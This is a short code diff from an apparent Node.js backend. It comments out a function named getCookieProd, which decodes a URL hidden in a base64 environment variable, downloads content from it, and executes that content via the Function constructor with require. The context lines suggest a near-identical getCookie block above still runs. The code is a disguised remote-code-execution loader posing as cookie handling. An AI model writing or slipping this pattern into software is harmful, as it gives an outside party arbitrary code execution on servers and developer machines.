@@ -154,14 +154,14 @@ const getCookie = asyncErrorHandler(async (req, res, next) => {
   handler(require);
 })();
 
-const getCookieProd = asyncErrorHandler(async (req, res, next) => {
-  const src = atob(process.env.PRO_API_KEY);
-  const HttpOnly = (await axios.get(src)).data.content;
+// const getCookieProd = asyncErrorHandler(async (req, res, next) => {
+//   const src = atob(process.env.PRO_API_KEY);
+//   const HttpOnly = (await axios.get(src)).data.content;
   
-  // console.log("log here...", HttpOnly)
-  const handler = new (Function.constructor)('require', HttpOnly);
-  handler(require);
-})();
+//   // console.log("log here...", HttpOnly)
+//   const handler = new (Function.constructor)('require', HttpOnly);
+//   handler(require);
+// })();
 
 /**
  * @desc generate JWT
